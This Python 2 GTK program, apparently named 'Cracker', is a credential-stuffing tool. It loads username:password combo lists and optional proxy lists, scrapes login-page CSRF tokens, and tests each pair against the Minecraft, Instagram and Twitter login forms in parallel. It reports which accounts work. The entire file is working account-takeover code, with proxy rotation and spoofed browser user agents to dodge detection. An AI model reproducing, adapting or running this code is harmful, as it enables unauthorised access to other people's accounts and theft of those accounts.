#!/usr/bin/env python
__author__ = 'Furry~'

import pygtk
import gtk
import urllib2
import re
import time
from cookielib import CookieJar
from random import choice
from multiprocessing import Pool
from multiprocessing import TimeoutError

services = ['Minecraft', 'Instagram', 'Twitter']


def get_active_text(combobox):
    model = combobox.get_model()
    active = combobox.get_active()
    if active < 0:
        return None
    return model[active][1]


def minecraft(item):
    work = True
    while work:
        if 'proxies' in globals():
            proxy = choice(proxies)
            proxy_handler = urllib2.ProxyHandler({
                'http': proxy,
                'https': proxy
            })
        else:
            proxy_handler = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36')]
        item = item.strip()
        try:
            data = opener.open('https://minecraft.net/login').read()
            regex = re.compile('<input type="hidden" name="authenticityToken" value="(.*)">')
            r = re.search(regex, data)
            for group in r.groups():
                regex = re.compile('(.*):(.*)')
                r = re.search(regex, item)
                login = opener.open('https://minecraft.net/login', 'authenticityToken={0}&username={1}&password={2}'.format(group, r.groups()[0], r.groups()[1]))
                if not 'login' in login.geturl():
                    print '{0}:{1} Works For Minecraft!'.format(r.groups()[0], r.groups()[1])
                else:
                    print '{0}:{1} Doesn\'t Works For Minecraft!'.format(r.groups()[0], r.groups()[1])
            work = False
        except Exception, e:
            print e
            work = True


def instagram(item):
    work = True
    while work:
        cj = CookieJar()
        if 'proxies' in globals():
            proxy = choice(proxies)
            proxy_handler = urllib2.ProxyHandler({
                'http': proxy,
                'https': proxy
            })
        else:
            proxy_handler = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36')]
        opener.addheaders = [('Referer', 'https://instagram.com/accounts/login/')]
        item = item.strip()
        try:
            data = opener.open('https://instagram.com/accounts/login/').read()
            regex = re.compile('<input type="hidden" name="csrfmiddlewaretoken" value="(.*)"/>')
            r = re.search(regex, data)
            for group in r.groups():
                regex = re.compile('(.*):(.*)')
                r = re.search(regex, item)
                login = opener.open('https://instagram.com/accounts/login/', 'csrfmiddlewaretoken={0}&username={1}&password={2}'.format(group, r.groups()[0], r.groups()[1]))
                if not 'Please enter a correct username and password' in login.read():
                    print '{0}:{1} Works For Instagram!'.format(r.groups()[0], r.groups()[1])
                else:
                    print '{0}:{1} Doesn\'t Work For Instagram!'.format(r.groups()[0], r.groups()[1])
            work = False
        except Exception, e:
            print e
            work = True


def twitter(item):
    work = True
    while work:
        cj = CookieJar()
        if 'proxies' in globals():
            proxy = choice(proxies)
            proxy_handler = urllib2.ProxyHandler({
                'http': proxy,
                'https': proxy
            })
        else:
            proxy_handler = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), proxy_handler)
        opener.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36')]
        opener.addheaders = [('Referer', 'https://twitter.com/')]
        item = item.strip()
        try:
            data = opener.open('https://twitter.com/').read()
            regex = re.compile('<input type="hidden" name="authenticity_token" value="(.*)">')
            r = re.search(regex, data)
            for group in r.groups():
                regex = re.compile('(.*):(.*)')
                r = re.search(regex, item)
                login = opener.open('https://twitter.com/sessions', 'authenticity_token={0}&session%5Busername_or_email%5D={1}&session%5Bpassword%5D={2}&remember_me=1&return_to_ssl=true&scribe_log=&redirect_after_login=%2F'.format(group, r.groups()[0], r.groups()[1]))
                if not 'error' in login.geturl() and not 'resend_password' in login.geturl() and 'twitter' in login.geturl():
                    print '{0}:{1} Works For Twitter!'.format(r.groups()[0], r.groups()[1])
                else:
                    print '{0}:{1} Doesn\'t Work For Twitter!'.format(r.groups()[0], r.groups()[1])
            work = False
        except Exception, e:
            print e
            work = True


class App(object):
    def __init__(self):
        self.builder = gtk.Builder()
        self.builder.add_from_file("Cracker.glade")
        self.builder.connect_signals(self)
        self.window = self.builder.get_object("window1")
        self.userpass = self.builder.get_object('entryuserpass')
        self.filechooserbutton = self.builder.get_object('filechooserbutton1')
        self.filechooserbutton1 = self.builder.get_object('filechooserbutton2')
        self.proxies = self.builder.get_object('entry1')
        self.liststore = gtk.ListStore(int, str)
        for i in xrange(len(services)):
            self.liststore.append([i, services[i]])
        self.ext = self.builder.get_object('combobox1')
        self.ext.set_model(self.liststore)
        self.cell = gtk.CellRendererText()
        self.ext.pack_start(self.cell, True)
        self.ext.add_attribute(self.cell, 'text', 1)
        self.ext.set_active(0)
        self.window.show()

    def on_window1_destroy(self, object, data=None):
        gtk.main_quit()

    def on_button1_clicked(self, object, data=None):
        if str(self.proxies.get_text()) is '':
            pass
        else:
            with open(self.proxies.get_text()) as f:
                global proxies
                proxies = f.readlines()
        if str(self.userpass.get_text()) is '':
            pass
        else:
            with open(self.userpass.get_text()) as f:
                global names
                names = f.readlines()
                print f.readlines()
        extget = get_active_text(self.ext)
        if extget == "Minecraft":
            if len(names) <= 15:
                p = Pool(processes=len(names))
            else:
                p = Pool(processes=15)
            for item in names:
                res = p.map_async(minecraft, [item])
                time.sleep(0.15)
            try:
                print res.get(timeout=20)
            except TimeoutError, ex:
                print ex
            p.close()
            p.join()
        if extget == "Instagram":
            if len(names) <= 15:
                p = Pool(processes=len(names))
            else:
                p = Pool(processes=15)
            for item in names:
                res = p.map_async(instagram, [item])
                time.sleep(0.15)
            try:
                print res.get(timeout=20)
            except TimeoutError, ex:
                print ex
            p.close()
            p.join()
        if extget == "Twitter":
            if len(names) <= 15:
                p = Pool(processes=len(names))
            else:
                p = Pool(processes=15)
            for item in names:
                res = p.map_async(twitter, [item])
                time.sleep(0.15)
            try:
                print res.get(timeout=20)
            except TimeoutError, ex:
                print ex
            p.close()
            p.join()

    def on_filechooserbutton1_file_set(self, object, data=None):
        self.userpass.set_text(self.filechooserbutton.get_filename())

    def on_filechooserbutton2_file_set(self, object, data=None):
        self.proxies.set_text(self.filechooserbutton1.get_filename())

if __name__ == '__main__':
    pygtk.require("2.0")
    app = App()
    gtk.main()